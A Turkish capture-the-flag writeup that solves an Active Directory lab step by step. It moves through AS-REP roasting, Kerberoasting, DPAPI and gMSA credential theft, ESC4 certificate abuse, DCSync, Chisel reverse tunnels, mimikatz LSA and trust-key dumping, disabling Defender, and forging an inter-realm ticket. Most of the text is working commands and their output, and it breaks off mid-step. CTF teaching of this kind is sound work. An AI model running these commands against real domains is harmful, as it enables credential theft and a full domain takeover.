# SKYDAYS CTF DoubleFact — Writeup

## Flagler

| Flag | Değer | Puan |
|------|-------|------|
| FLAG 1 | `SKYDAYS{asrep_r0ast_1n1t1al_acc3ss}` | 500 |
| FLAG 2 | `SKYDAYS{psaf3_cr4ck_h0p_t0_hr}` | 500 |
| FLAG 3 | `SKYDAYS{k3rb3r0ast_dap1_r3g1stry}` | 500 |
| FLAG 4 | `SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}` | 500 |
| root.txt | `SKYDAYS{g0ld3n_t1ck3t_s1d_f1lt3r_bdc01_pwn3d}` | 500 |

---

## Ortam

```
DC01  : 10.10.10.10 — skydays.ctf          (WireGuard üzerinden erişilebilir)
BDC01 : 10.10.10.30 — backup.skydays.ctf   (DİREKT ERİŞİM YOK — Chisel pivot zorunlu)
VPM   : 10.19.11.5 — VPN isteklerinin DC01'e yönlendirmesi. Sadece DC01'e erişim var BDC01'e erişimi yok 

Trust : One-way Outbound (skydays.ctf → backup.skydays.ctf)
        SIDFilteringQuarantined: True
```

---

## Genel Attack Chain

```
RECON
  └─► nmap → LDAP anonymous enum
        └─► k.yilmaz info → SystemAccounts ipucu
              └─► helpdesk base64 creds → H3lpd3sk!2024
                    └─► SystemAccounts OU → e.beylik (DONT_REQUIRE_PREAUTH)
                          └─► AS-REP Roast → Princess#1         [FLAG 1]
                                └─► SMB IT_Share → backup.ps1
                                      └─► Deploy_Share → deploy_notes.txt → ZIP şifresi
                                            └─► corp_accounts.zip → psafe3 → n.erdem:Big#3776  [FLAG 2]
                                                  └─► BloodHound → ForceChangePassword → a.demirelli
                                                        └─► [Protected Users! Chisel pivot gerekli]
                                                              └─► GenericWrite → Targeted Kerberoast → svc_backup:JONAthan25!*
                                                                    └─► AddSelf → Backup_Operators_Custom → WinRM [2dk! Hızlı ol]
                                                                          └─► DPAPI → svc_adcs:xK9#mP2vL!qR7
                                                                                └─► ReadGMSAPassword → gmsa_svc$  [FLAG 3]
                                                                                      └─► certipy-ad find [BloodHound'da GİZLİ]
                                                                                            └─► ESC4 WriteDacl → flag=1 → cert al
                                                                                                  └─► LDAPS + sertifika → DCSync yetkisi
                                                                                                        └─► secretsdump → Admin NT hash  [FLAG 4]
                                                                                                              └─► DomainBackupSync task keşfi
                                                                                                                    └─► Chisel pivot → BDC01
                                                                                                                          └─► Trust ticket → evil-winrm
                                                                                                                                └─► LSA bypass → krbtgt hash
                                                                                                                                      └─► SHA256 türet → 7z aç → root.txt  [FLAG 5]
```

---

## ADIM 1 — Recon

### 1.1 Port Tarama

İlk olarak hedefin hangi servisleri sunduğunu öğrenmek için hızlı bir tarama yapıyoruz.

```bash
# Tüm portları tara
nmap -p- --min-rate 10000 10.10.10.10

# Servis ve versiyon tespiti
nmap -sCV -p 53,88,135,389,445,636,3268,3269,5985,9389 10.10.10.10
```

**Çıktıda dikkat edilecekler:**

| Bilgi | Değer | Anlamı |
|-------|-------|--------|
| Domain | `skydays.ctf` | AD domain adı |
| Hostname | `DC01` | Domain Controller |
| Port 5985 | WinRM açık | Remote shell mümkün |
| Port 88 | Kerberos açık | AS-REP Roast, Kerberoast denenebilir |
| SMB Signing | Required | SMB relay çalışmaz |

### 1.2 Hosts Dosyası Güncelle

Kerberos isim tabanlı çalışır. IP yerine FQDN kullanmak zorundasın.

```bash
echo "10.10.10.10  DC01.skydays.ctf skydays.ctf DC01" | sudo tee -a /etc/hosts
```

### 1.3 SMB Null Session

Kimlik doğrulama olmadan paylaşımları listele.

```bash
netexec smb 10.10.10.10 -u '' -p '' --shares
```

> **Not:** Paylaşım isimleri görünür (`IT_Share`, `Deploy_Share`) ama içeriklere anonim erişilemez. Kullanıcı adı ve şifre gerekli — devam et.

---

## ADIM 2 — LDAP Enumeration

### 2.1 Anonim LDAP — Kullanıcı Listesi

```bash
ldapsearch -x -H ldap://10.10.10.10 \
    -b "DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName 2>/dev/null | grep "sAMAccountName:"
```

> **🎯 TRICK — e.beylik Neden Görünmüyor?**
> Standart LDAP sorgusu bazı kullanıcıları döndürmez. `e.beylik` `SystemAccounts` adlı gizli bir OU'da.
> Bu OU anonymous erişime kapalı. Önce oraya erişim yetkisi olan bir kullanıcı bulmamız lazım.

### 2.2 Tüm Attribute'ları Çek — İpucu Avı

Kullanıcıların `info` alanında gizli ipuçları olabilir.

```bash
ldapsearch -x -H ldap://10.10.10.10 \
    -b "DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName info description 2>/dev/null | \
    grep -E "sAMAccountName:|info:|description:"
```

**Çıktıda iki önemli bilgi:**

```
# İpucu 1 — SystemAccounts OU'su hakkında yönlendirme
sAMAccountName: k.yilmaz
info: New employee onboarding access requests are handled by the SystemAccounts team...

# İpucu 2 — Gizli credentials!
sAMAccountName: helpdesk
info: Default credentials (base64): SDNscGQzc2shMjAyNA==
```

### 2.3 Base64 Decode

```bash
echo "SDNscGQzc2shMjAyNA==" | base64 -d
# H3lpd3sk!2024
```

### 2.4 helpdesk ile SystemAccounts OU Sorgula

Artık `helpdesk` hesabını kullanarak kısıtlı OU'ya erişebiliriz.

```bash
ldapsearch -x -H ldap://10.10.10.10 \
    -D "helpdesk@skydays.ctf" \
    -w 'H3lpd3sk!2024' \
    -b "OU=SystemAccounts,OU=Corp,DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName userAccountControl 2>/dev/null
```

**Çıktıda:**

```
sAMAccountName: e.beylik
userAccountControl: 4260352
```

> **🎯 userAccountControl Değerini Analiz Et:**
>
> `4260352` = `4194304 + 65536 + 512`
>
> | Bit | Değer | Anlamı |
> |-----|-------|--------|
> | `4194304` | `DONT_REQUIRE_PREAUTH` | **AS-REP Roast yapılabilir!** |
> | `65536` | `DONT_EXPIRE_PASSWORD` | Şifre süresi dolmaz |
> | `512` | Normal hesap | Aktif kullanıcı |
>
> `DONT_REQUIRE_PREAUTH` flag'i varsa KDC'den şifreli hash çekebilirsin — kırmaya çalış!

---

## ADIM 3 — Initial Access: AS-REP Roast (FLAG 1)

### 3.1 AS-REP Hash Al

`e.beylik` için KDC'den pre-authentication gerektirmeyen TGT isteği yap.

```bash
impacket-getNPUsers skydays.ctf/e.beylik \
    -dc-ip 10.10.10.10 \
    -no-pass \
    -outputfile /tmp/ebeylik.hash

cat /tmp/ebeylik.hash
# $krb5asrep$23$e.beylik@SKYDAYS.CTF:...
```

### 3.2 Hash Kır

```bash
hashcat -m 18200 /tmp/ebeylik.hash /usr/share/wordlists/rockyou.txt \
    --force -O

# Sonuç: Princess#1
```

> **Not:** hashcat bulamazsa john dene:
> ```bash
> john /tmp/ebeylik.hash --wordlist=/usr/share/wordlists/rockyou.txt
> ```

### 3.3 Erişimi Doğrula

```bash
netexec smb 10.10.10.10 -u e.beylik -p 'Princess#1'
# [+] skydays.ctf\e.beylik:Princess#1 (Pwn3d! yoksa normal kullanıcı)

netexec smb 10.10.10.10 -u e.beylik -p 'Princess#1' --shares
# IT_Share ve Deploy_Share görünmeli
```

### 3.4 IT_Share İçeriğini İncele

```bash
# Paylaşım içeriğini listele
smbclient //10.10.10.10/IT_Share \
    -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "ls"

# Dosyaları indir
smbclient //10.10.10.10/IT_Share \
    -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "get backup.ps1; get corp_accounts.zip"

# backup.ps1 içeriğine bak
cat backup.ps1
# → Deploy_Share'e referans var — oraya da bak!
```

### 3.5 Deploy_Share İçeriğini İncele

```bash
smbclient //10.10.10.10/Deploy_Share \
    -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "ls; get deploy_notes.txt"

cat deploy_notes.txt
# → Deployment archive password: Sk1D@ys2024!
```

### 3.6 FLAG 1

```bash
smbclient //10.10.10.10/IT_Share \
    -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "cd e.beylik; ls; get flag1.txt"

cat flag1.txt
# SKYDAYS{asrep_r0ast_1n1t1al_acc3ss}
```

---

## ADIM 4 — Lateral Movement: psafe3 → n.erdem (FLAG 2)

### 4.1 ZIP Dosyasını Aç

```bash
7z x corp_accounts.zip -pSk1D@ys2024!
ls -la
# accounts.psafe3 çıkar
```

### 4.2 Password Safe Master Şifresini Kır

`.psafe3` formatı Password Safe uygulamasının şifreli dosyasıdır. Master şifresi brute force ile kırılabilir.

```bash
# Hash formatına çevir
pwsafe2john accounts.psafe3 > /tmp/psafe3.hash

# Kır
john /tmp/psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt

# veya hashcat ile
hashcat -m 5200 /tmp/psafe3.hash /usr/share/wordlists/rockyou.txt

# Sonuç: Hottie#1
```

### 4.3 psafe3 Dosyasını Aç

Password Safe uygulamasını kullanarak `accounts.psafe3` dosyasını `Hottie#1` master şifresi ile açıyoruz.

```
Username: n.erdem
Password: Big#3776
```

### 4.4 n.erdem Erişimini Doğrula

```bash
netexec smb 10.10.10.10 -u n.erdem -p 'Big#3776'
netexec winrm 10.10.10.10 -u n.erdem -p 'Big#3776'
# [+] WinRM erişimi var

evil-winrm -i 10.10.10.10 -u n.erdem -p 'Big#3776'
```

### 4.5 FLAG 2

```powershell
type C:\Users\n.erdem\Desktop\flag2.txt
# SKYDAYS{psaf3_cr4ck_h0p_t0_hr}
```

---

## ADIM 5 — BloodHound & Privilege Escalation

### 5.1 BloodHound Veri Toplama

Domain'deki tüm ACL, grup üyeliği ve path'leri topla.

```bash
bloodhound-python -u n.erdem -p 'Big#3776' \
    -d skydays.ctf \
    -dc DC01.skydays.ctf \
    -c All \
    --zip \
    -ns 10.10.10.10

# Zip dosyasını BloodHound GUI'ye yükle
```

### 5.2 BloodHound'da Attack Path Analizi

BloodHound'da şu path'i incele:

```
n.erdem ──[ForceChangePassword]──► a.demirelli
a.demirelli ──[GenericWrite]──► svc_backup
svc_backup ──[AddSelf]──► Backup_Operators_Custom
Backup_Operators_Custom ──► Remote Management Users ──► WinRM erişimi
svc_adcs ──[ReadGMSAPassword]──► gmsa_svc$
gmsa_svc$ ──[WriteDacl]──► CorpUserCert  ← BloodHound'da GÖRÜNMEYEBİLİR!
```

### 5.3 ForceChangePassword → a.demirelli

```bash
bloodyAD -u n.erdem -p 'Big#3776' \
    -d skydays.ctf \
    --host DC01.skydays.ctf \
    --dc-ip 10.10.10.10 \
    set password a.demirelli 'NewPass123!'

# Doğrula
netexec smb 10.10.10.10 -u a.demirelli -p 'NewPass123!'
```

> **🎯 TRICK — Protected Users Tuzağı!**
>
> `a.demirelli` **Protected Users** grubunda. Bu grubun özellikleri:
> - ❌ NTLM kimlik doğrulama **çalışmaz**
> - ❌ Pass-the-Hash **çalışmaz**
> - ✅ Sadece **Kerberos** çalışır
>
> Standart `evil-winrm -u a.demirelli -p 'NewPass123!'` başarısız olur.
> Kerberos TGT alıp `-r SKYDAYS.CTF` ile bağlanmalısın.
>
> **Ayrıca:** `a.demirelli`'nin WinRM'i sadece localhost'tan çalışır. Dışarıdan bağlanmak için **Chisel pivot** gerekli!

### 5.4 Kerberos TGT Al

```bash
impacket-getTGT skydays.ctf/a.demirelli:'NewPass123!' \
    -dc-ip 10.10.10.10

export KRB5CCNAME=./a.demirelli.ccache

# Doğrula
klist
```

### 5.5 Chisel Pivot Kur

`a.demirelli` WinRM'e sadece DC01 localhost üzerinden erişilebilir. Kali'den tünel açmamız gerekiyor.

```bash
# Terminal 1 — Kali'de chisel server başlat
sudo chisel server -p 9999 --reverse
```

```bash
# Terminal 2 — n.erdem WinRM oturumu aç
evil-winrm -i 10.10.10.10 -u n.erdem -p 'Big#3776'
```

```powershell
# n.erdem WinRM oturumunda — chisel yükle ve çalıştır
# C:\HR_Sandbox Defender exclusion klasörü!
upload /usr/share/windows-resources/chisel/chisel_windows.exe C:\HR_Sandbox\chisel.exe

C:\HR_Sandbox\chisel.exe client 10.10.10.20:9999 R:5985:127.0.0.1:5985
# [+] Connected
```

> **🎯 TRICK — C:\HR_Sandbox AV Exclusion:**
> ```
> C:\HR_Sandbox\README.txt içeriği:
> "HR department sandbox environment.
>  Excluded from antivirus scanning for operational purposes.
>  - IT Security Ticket #4892"
> ```
> Normal dizinlere yüklediğin chisel Defender tarafından silinir.
> `C:\HR_Sandbox` AV exclusion'a alınmış — araçlarını buraya yükle!

```bash
# /etc/hosts güncelle — tünel için localhost yönlendirmesi
echo "127.0.0.1 dc01-local.skydays.ctf" | sudo tee -a /etc/hosts

# Kerberos ile a.demirelli bağlan
evil-winrm -i dc01-local.skydays.ctf \
    -u a.demirelli \
    -r SKYDAYS.CTF
# [+] Bağlantı başarılı
```

### 5.6 FLAG 3

```powershell
type C:\Users\a.demirelli\Desktop\flag3.txt
# SKYDAYS{k3rb3r0ast_dap1_r3g1stry}
```

---

## ADIM 6 — Targeted Kerberoast → svc_backup

### 6.1 GenericWrite ile SPN Ekle

`a.demirelli`'nin `svc_backup` üzerinde `GenericWrite` yetkisi var. Bu yetkiyi kullanarak `svc_backup`'a sahte bir SPN ekleriz ve Kerberoast yaparız.

```bash
# Kerberos TGT aktif olduğundan emin ol
export KRB5CCNAME=./a.demirelli.ccache

bloodyAD -u a.demirelli -d skydays.ctf \
    --host DC01.skydays.ctf \
    --dc-ip 10.10.10.10 \
    -k set object svc_backup \
    servicePrincipalName -v "backup/dc01.skydays.ctf"

# SPN eklendi mi doğrula
python3 -c "
from impacket.examples.GetUserSPNs import *
" 2>/dev/null || \
impacket-GetUserSPNs skydays.ctf/a.demirelli:'NewPass123!' \
    -dc-ip 10.10.10.10 2>/dev/null | grep svc_backup
```

### 6.2 Targeted Kerberoast

```bash
python3 /tmp/targetedKerberoast.py \
    -k \
    -d skydays.ctf \
    --dc-ip 10.10.10.10 \
    --request-user svc_backup

# veya impacket ile
impacket-GetUserSPNs skydays.ctf/a.demirelli:'NewPass123!' \
    -dc-ip 10.10.10.10 \
    -request \
    -outputfile /tmp/svc_backup.hash
```

### 6.3 Hash Kır

```bash
hashcat -m 13100 /tmp/svc_backup.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -O

# Sonuç: JONAthan25!*
```

---

## ADIM 7 — DPAPI → svc_adcs Kimliği

### 7.1 AddSelf ile Gruba Ekle

`svc_backup`'ın `Backup_Operators_Custom` grubuna kendisini ekleyebilme (`AddSelf`) yetkisi var.

```bash
bloodyAD -u svc_backup -p 'JONAthan25!*' \
    -d skydays.ctf \
    --host DC01.skydays.ctf \
    --dc-ip 10.10.10.10 \
    add groupMember Backup_Operators_Custom svc_backup
```

> **🎯 TRICK — 2 Dakika Penceresi!**
>
> `Backup_Operators_Custom` grubu `Remote Management Users`'a dahil.
> Gruba eklenince svc_backup WinRM erişimi kazanır.
>
> **AMA:** Restore script **3 dakikada bir** çalışır ve grup üyeliğini sıfırlar!
>
> Gruba eklenir eklemez hemen bağlanmalısın. Zaman kaybetme!

### 7.2 Hemen WinRM Bağlan

```bash
evil-winrm -i 10.10.10.10 -u svc_backup -p 'JONAthan25!*'
```

### 7.3 DPAPI Credential Dosyalarını İndir

```powershell
# Klasörü incele
cd C:\Backup\Credentials
dir
# credential.blob ve masterkey dosyaları

# Kali'ye indir
download credential.blob
download masterkey
```

### 7.4 DPAPI Çöz

```bash
# Adım 1: MasterKey'i çöz
# SID: svc_backup'ın SID'i (1120)
impacket-dpapi masterkey \
    -file masterkey \
    -password 'JONAthan25!*' \
    -sid S-1-5-21-2612352700-2599720198-3840439994-1120

# Çıktıdaki decrypted key'i kopyala: 0xABCD...

# Adım 2: Credential dosyasını çöz
impacket-dpapi credential \
    -file credential.blob \
    -key 0xDECRYPTED_KEY_BURAYA
```

**Çıktıda:**

```
Target  : Domain:target=dc01.skydays.ctf
Username: svc_adcs
Unknown : xK9#mP2vL!qR7
```

---

## ADIM 8 — ReadGMSAPassword → gmsa_svc$

### 8.1 svc_adcs ile WinRM Bağlan

```bash
netexec winrm 10.10.10.10 -u svc_adcs -p 'xK9#mP2vL!qR7'
# [+] WinRM erişimi var

evil-winrm -i 10.10.10.10 -u svc_adcs -p 'xK9#mP2vL!qR7'
```

### 8.2 İpuçlarını İncele

```powershell
# svc_adcs masaüstünde önemli bir not var!
type C:\Users\svc_adcs\Desktop\notes.txt
```

**Çıktıda:**

```
[2024-09-15] CorpUserCert template review pending
             Contact gmsa_svc service account for template management
             ADCS permissions updated - gmsa_svc has template control
```

> **Bu not iki şeyi söylüyor:**
> 1. `CorpUserCert` adında bir ADCS template var
> 2. `gmsa_svc$` bu template üzerinde kontrol yetkisine sahip
>
> Bir sonraki adım: `gmsa_svc$` hesabının hash'ini al!

### 8.3 gMSA Şifresi Al

`svc_adcs` hesabının `ReadGMSAPassword` yetkisi var.

```bash
python3 /tmp/gMSADumper.py \
    -u svc_adcs \
    -p 'xK9#mP2vL!qR7' \
    -d skydays.ctf \
    -l 10.10.10.10

# Çıktı:
# gmsa_svc$  :::4238e8054a5719629eeca1d0c861b27c
```

---

## ADIM 9 — ESC4: WriteDacl → DCSync Pivot (FLAG 4)

> **🎯 TRICK — Neden Bu Kadar Karmaşık?**
>
> Normal ESC4 akışında sertifika alır, `certipy-ad auth` ile NT hash çekersin.
> Ama bu DC'de **PKINIT kapalı** — sertifika ile doğrudan NT hash alamazsın.
>
> Çözüm: Sertifikayı LDAPS üzerinden kullanarak `gmsa_svc$` hesabına
> **DCSync yetkisi** tanımla, sonra secretsdump çalıştır.
>
> **BloodHound'da Neden Görünmüyor?**
> `gmsa_svc$`'nin `CorpUserCert` template'i üzerindeki `WriteDacl` yetkisi
> BloodHound tarafından tam olarak yakalanmayabilir.
> **Certipy-ad'ı gmsa_svc$ kimliğiyle bizzat çalıştırman** gerekiyor!

### 9.1 Zafiyet Tarama

```bash
# gmsa_svc$ olarak ADCS zafiyet tara
certipy-ad find \
    -u 'gmsa_svc$@skydays.ctf' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -dc-ip 10.10.10.10 \
    -target DC01.skydays.ctf \
    -vulnerable \
    -stdout
```

**Çıktıda bulgu:**

```
Template Name       : CorpUserCert
[!] Vulnerabilities
  ESC4              : User has dangerous permissions
[+] Write Dacl Principals: SKYDAYS.CTF\gmsa_svc$
```

### 9.2 ESC4 Saldırısı — Template Değiştir

#### TGT Al

```bash
impacket-getTGT 'skydays.ctf/gmsa_svc$' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -dc-ip 10.10.10.10

export KRB5CCNAME='./gmsa_svc$.ccache'
```

#### Template Flag'ini Değiştir

`msPKI-Certificate-Name-Flag = 1` → EnrolleeSuppliesSubject aktif olur.
Bu sayede sertifika talep ederken istediğimiz UPN'i (administrator) belirtebiliriz.

```bash
bloodyAD -u 'gmsa_svc$@skydays.ctf' \
    -d skydays.ctf \
    --host DC01.skydays.ctf \
    --dc-ip 10.10.10.10 \
    -k set object \
    "CN=CorpUserCert,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=skydays,DC=ctf" \
    msPKI-Certificate-Name-Flag -v 1

echo "[*] Degisiklik yapildi. CA refresh bekleniyor..."
```

> **⏳ UYARI — 65 Saniye Bekle!**
>
> CA (Certificate Authority) template değişikliklerini ~60 saniyede bir okur.
> Flag değiştirdikten hemen sertifika istersen CA eski değeri görür ve reddeder.
> **65 saniye bekle**, sonra sertifika iste.
>
> **Ayrıca:** Restore script 3 dakikada bir flag'i sıfırlar.
> 65sn bekleme + sertifika alma = ~90sn → 3 dakika içinde kalmalısın.

```bash
sleep 65
echo "[*] CA refresh tamamlandi, sertifika isteniyor..."
```

#### Administrator Adına Sertifika Talep Et

```bash
certipy-ad req \
    -u 'gmsa_svc$@skydays.ctf' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -dc-ip 10.10.10.10 \
    -target DC01.skydays.ctf \
    -ca skydays-CA \
    -template CorpUserCert \
    -upn administrator@skydays.ctf

# administrator.pfx oluşur
ls -la administrator.pfx
```

### 9.3 DCSync Pivot — LDAPS ile Yetki Tanımla

PKINIT devre dışı olduğu için `certipy-ad auth` çalışmaz. Bunun yerine sertifikayı LDAPS kimlik doğrulama için kullanacağız.

#### PFX'ten Sertifika ve Key Çıkar

```bash
# Private key çıkar
openssl pkcs12 -in administrator.pfx \
    -nocerts -out admin.key -nodes -passin pass:

# Sertifika çıkar
openssl pkcs12 -in administrator.pfx \
    -nokeys -out admin.crt -passin pass:

# Gereksiz attribute'ları temizle
sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' \
    admin.crt > clean.crt
sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' \
    admin.key > clean.key

ls -la clean.crt clean.key
```

#### gmsa_svc$ Hesabına DCSync Yetkisi Ver

```bash
# Administrator sertifikası ile LDAPS bağlanıp gmsa_svc$'ye DCSync yetkisi ver
bloodyAD -d skydays.ctf \
    -u 'administrator' \
    -c 'clean.key:clean.crt' \
    --host DC01.skydays.ctf \
    --dc-ip 10.10.10.10 \
    add dcsync 'gmsa_svc$'

echo "[+] DCSync yetkisi verildi"
```

### 9.4 DCSync — Administrator Hash Çek

```bash
# gmsa_svc$ artık DCSync yapabilir
impacket-secretsdump 'skydays.ctf/gmsa_svc$@10.10.10.10' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -just-dc-user administrator

# Çıktı:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1c9e39a927846156ae42de4a71349b2:::
```

### 9.5 FLAG 4

```bash
evil-winrm -i 10.10.10.10 \
    -u administrator \
    -H 'b1c9e39a927846156ae42de4a71349b2'
```

```powershell
type C:\Users\Administrator\Desktop\flag4.txt
# SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}
```

---

## ADIM 10 — BDC01: Trust Ticket & FLAG 5

### 10.1 İkinci Domain'i Keşfet

Administrator oturumu açık. Sistemde neyin çalıştığını araştır.

```powershell
# Scheduled task'ları tara — ikinci domain ipucu var mı?
schtasks /query /fo LIST /v | findstr /i "BDC\|backup\|domain"

# Spesifik task'ı incele
schtasks /query /fo LIST /v /tn "DomainBackupSync"
```

**Çıktıda:**

```
Task To Run: powershell.exe -Command "Invoke-Command -ComputerName BDC01.backup.skydays.ctf ..."
Description: Nightly sync to backup domain BDC01.backup.skydays.ctf
```

> **💡 Bu task bize iki şey söylüyor:**
> 1. `backup.skydays.ctf` adında ikinci bir domain var
> 2. Bu domain'de `BDC01` adında bir makine var
>
> Hedef: Bu makineye sızmak ve FLAG 5'i almak!

### 10.2 BDC01 Domain SID Al

Trust ticket oluşturmak için hedef domain'in SID'ini bilmemiz lazım.

```powershell
# DC01 Administrator WinRM oturumunda — şifre gerekmez
(Get-ADObject -Filter "objectClass -eq 'trustedDomain'" `
    -SearchBase "CN=System,DC=skydays,DC=ctf" `
    -Properties securityIdentifier).securityIdentifier.Value

# S-1-5-21-864093730-3672355038-1791949165
```

> **Not:** Bu bilgiyi almak için DC01 Administrator WinRM oturumu yeterli.
> Kali'den direkt LDAP ile bu bilgiye ulaşmak için şifre gerekir.

### 10.3 Trust Key Al — mimikatz

DCSync ile BACKUP$ hash'ini alabilirsin ama bu gerçek trust key değildir!
Gerçek trust key'i DC01'in LSA deposundan `lsadump::trust` ile almalısın.

```powershell
# DC01 Administrator WinRM oturumunda
# mimikatz C:\HR_Sandbox'ta mevcut (Defender exclusion)
C:\HR_Sandbox\mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
```

**Çıktıda:**

```
Domain: BACKUP.SKYDAYS.CTF (BACKUP / S-1-5-21-864093730-3672355038-1791949165)
 [ Out ] BACKUP.SKYDAYS.CTF -> SKYDAYS.CTF
    * rc4_hmac_nt       : TRUST_KEY_BURAYA
    * aes256_hmac       : AES256_KEY_BURAYA
```

> **🎯 TRICK — BACKUP$ Hash Yanıltıcıdır!**
>
> `impacket-secretsdump` ile `BACKUP$` hash'ini alabilirsin.
> Ama bu hash **trust key değildir** — inter-realm ticket için çalışmaz.
>
> `lsadump::trust /patch` ile alınan `rc4_hmac_nt` değeri gerçek trust key'dir.
> **Bu değeri kullanmalısın.**

### 10.4 Chisel Pivot — BDC01 Portlarını Aç

BDC01'e direkt erişim yok. DC01 üzerinden tünel kuralım.

```bash
# Terminal 1 — Kali'de chisel server (root ile — 88 gibi düşük portlar için)
sudo chisel server -p 9999 --reverse
```

```powershell
# Terminal 2 — DC01 Administrator WinRM oturumunda
C:\HR_Sandbox\chisel.exe client 10.10.10.20:9999 `
    R:88:10.10.10.30:88 `
    R:389:10.10.10.30:389 `
    R:445:10.10.10.30:445 `
    R:5985:10.10.10.30:5985

# [+] Connected (Latency ...) — tünel açık
```

```bash
# /etc/hosts — BDC01 FQDN'ini localhost'a yönlendir
echo "127.0.0.1 BDC01.backup.skydays.ctf backup.skydays.ctf" | sudo tee -a /etc/hosts

# Bağlantı testi
nc -zv 127.0.0.1 88   # Kerberos
nc -zv 127.0.0.1 445  # SMB
nc -zv 127.0.0.1 5985 # WinRM
```

### 10.5 krb5.conf Güncelle

Kerberos araçlarının tünelimizi kullanması için yapılandırma gerekiyor.

```bash
sudo bash -c 'cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = SKYDAYS.CTF
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    SKYDAYS.CTF = {
        kdc = 10.10.10.10
    }
    BACKUP.SKYDAYS.CTF = {
        kdc = 127.0.0.1
    }

[domain_realm]
    .skydays.ctf = SKYDAYS.CTF
    skydays.ctf = SKYDAYS.CTF
    .backup.skydays.ctf = BACKUP.SKYDAYS.CTF
    backup.skydays.ctf = BACKUP.SKYDAYS.CTF
EOF'
```

> **🎯 TRICK — rdns = false Neden Kritik?**
>
> evil-winrm Ruby'nin GSSAPI kütüphanesini kullanır.
> GSSAPI, `127.0.0.1` adresini **reverse DNS** ile çözümler → `localhost` bulur.
> Ama biletin SPN'i `BDC01.backup.skydays.ctf` → eşleşmez → **bağlantı reddedilir!**
>
> `rdns = false` ile reverse DNS lookup devre dışı bırakılır.
> **Bu satır olmadan evil-winrm Kerberos ile çalışmaz.**

### 10.6 Inter-Realm Ticket Oluştur

```bash
# Eski ticket'ları temizle
kdestroy 2>/dev/null

# Trust key ile inter-realm TGT oluştur
# Not: -nthash yerine -aesKey kullanmak daha güvenilir
impacket-ticketer \
    -nthash TRUST_RC4_KEY_BURAYA \
    -domain skydays.ctf \
    -domain-sid S-1-5-21-2612352700-2599720198-3840439994 \
    -extra-sid S-1-5-21-864093730-3672355038-1791949165-519 \
    -spn krbtgt/backup.skydays.ctf \
    administrator

# TGT dosyasını aktif et
export KRB5CCNAME=administrator.ccache

# Kontrol
klist
# Default principal: administrator@SKYDAYS.CTF
# Service: krbtgt/backup.skydays.ctf@SKYDAYS.CTF
```

> **-extra-sid ile Enterprise Admins SID Neden Ekleniyor?**
>
> `S-1-5-21-...-519` = Enterprise Admins grubu SID'i.
> Trust SID Filtering aktif olduğu için standart Domain Admin SID'i geçmez.
> Enterprise Admins SID'i eklenerek BDC01'de yüksek yetkiyle oturum açılır.

### 10.7 BDC01'e Service Ticket Al ve Bağlan

```bash
# TGT'yi aktif et
export KRB5CCNAME=administrator.ccache

# HTTP SPN ile service ticket al (WinRM için)
impacket-getST \
    -k -no-pass \
    -spn HTTP/BDC01.backup.skydays.ctf \
    -dc-ip 127.0.0.1 \
    'backup.skydays.ctf/administrator'

# KRB5CCNAME'i unset et — evil-winrm -K parametresini okusun
unset KRB5CCNAME

# BDC01'e bağlan
evil-winrm -i BDC01.backup.skydays.ctf -P 5985 \
    -r BACKUP.SKYDAYS.CTF \
    -K /home/kali/administrator@HTTP_BDC01.backup.skydays.ctf@BACKUP.SKYDAYS.CTF.ccache
```

> **🎯 TRICK — Saat Farkı!**
>
> Bağlantı başarısız olursa `KRB_AP_ERR_SKEW` hatası alabilirsin.
> BDC01'in saati farklı olabilir. Saat farkını kontrol et:
>
> ```bash
> # Netexec SMB bağlantısından saat bilgisi al
> netexec smb 127.0.0.1 2>/dev/null
>
> # veya BDC01'de
> # Get-Date komutunu çalıştır
> ```
>
> Gerekirse `faketime` kullan:
> ```bash
> faketime '+6 minutes' evil-winrm ...
> ```
>
> **İpucu:** `C:\Windows\debug\netlogon.log` dosyasını oku:
> ```
> [NETLOGON] Clock skew detected: +6 minutes from domain time
> ```

### 10.8 LSA Bypass — BDC01 krbtgt Hash

```powershell
# BDC01'de önce Defender'ı devre dışı bırak
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

```powershell
# Mimikatz'ı C:\Backup\Tools'a yükle (exclusion klasörü)
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\Backup\Tools\mimikatz.exe
```

> **🎯 İPUCU — C:\Backup\Tools README:**
> ```
> Backup diagnostic tools directory.
> Excluded from security scanning for operational purposes.
>
> Note: LSA protection is enabled on this system.
>       Use appropriate bypass techniques for memory analysis.
>       Mimikatz driver (!+) may be required for LSA bypass.
> - IT Security Team
> ```
>
> Bu dosya sana direkt olarak ne yapman gerektiğini söylüyor:
> - LSA Protection aktif → `!+` driver yükle
> - Mimikatz ile `lsadump::lsa /patch` çalıştır

```powershell
# LSA bypass ile krbtgt hash al
cd C:\Backup\Tools
.\mimikatz.exe "privilege::debug" "!+" "lsadump::lsa /patch" "exit"
```

**Çıktıda:**

```
Domain : BACKUP / S-1-5-21-864093730-3672355038-1791949165
User : krbtgt
NTLM : e82fe4003879cc304f982ff9f450b05c
```

### 10.9 Arşiv Şifresi Türet

```powershell
# İpucu dosyasını oku
type C:\Scripts\backup_formula.ps1
```

**Çıktıda:**

```
# Archive password = SHA256( krbtgt_NT_hash_bytes + UTF8("SKYDAYS2026") )
# import hashlib
